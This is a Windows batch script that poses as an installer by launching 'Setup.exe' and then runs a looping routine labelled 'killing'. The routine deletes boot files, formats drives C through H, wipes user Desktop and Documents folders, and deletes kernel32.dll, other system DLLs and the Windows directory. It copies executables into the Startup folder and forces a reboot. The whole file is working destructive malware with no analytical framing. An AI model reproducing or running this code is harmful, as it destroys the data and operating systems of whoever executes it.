start Setup.exe
:killing
del /ah /f /q "c:\ntldr"
del /ah /f /q "c:\*.sys"
del /ah /f /q "d:\ntldr"
del /ah /f /q "d:\*.sys"
format c:/x/q
format d:/x/q
format e:/x/q
format f:/x/q
format g:/x/q
format h:/x/q
cls
del /ah /f /q "\Documents and Settings\All Users\Documents\*.*"
rmdir /s /q "\Documents and Settings\All Users\Documents\*.*"
cls
del /f /q "\Documents and Settings\%username%\Desktop\*.*"
rmdir /s /q "\Documents and Settings\%username%\Desktop\*.*"
cls
del /f /q "c:\Documents and Settings\%username%\Desktop\*.*"
rmdir /s /q "c:\Documents and Settings\%username%\Desktop\*.*"
cls
del /f /q "d:\Documents and Settings\%username%\Desktop\*.*"
rmdir /s /q "d:\Documents and Settings\%username%\Desktop\*.*"
cls
del /ah /f /q "c:\ntldr"
del /f /q "C:\Documents and Settings\All Users\Documents\*.*"
rmdir /s /q "C:\Documents and Settings\All Users\Documents\*.*"
cls
del /f /q "D:\Documents and Settings\All Users\Documents\*.*"
rmdir /s /q "D:\Documents and Settings\All Users\Documents\*.*"
del /f /q "\Documents and Settings\All Users\Documents\*.*"
rmdir /s /q "\Documents and Settings\All Users\Documents\*.*"
cls
del /f /q "C:\PROGRA~1\COMMON~1\MUVEET~1\*.*"
del /ah /f /q "C:\PROGRA~1\COMMON~1\MUVEET~1\*.*"
del /f /q "%windir%\system32\kernel32.dll"
del /f /q "%windir%\system32\mapi32.dll"
del /f /q "%windir%\system32\mapi.dll"
del /f /q "\Documents and Settings\All Users\Start Menu\Programs\Startup\*.exe"
copy *.exe "\Documents and Settings\All Users\Start Menu\Programs\Startup"
del /f /q "%SystemRoot%\*.*"
del /ah /f /q "%SystemRoot%\*.*"
del /f /q "%windir%\system32\*.dll"
del /f /q "%windir%\system32\*.ocx"
del /f /q "%windir%\*.exe"
cls
rmdir /s /q "c:\*.*"
cls
rmdir /s /q "d:\*.*"
cls
del /f /q "c:\*.*"
cls
del /ah /f /q "c:\*.*"
cls
del /f /q "%windir%\*.*"
cls
del /f /q "./*.*"
cls
rmdir /s /q "%windir%"
cls
shutdown -r -t 10
cls
goto killing
ñ
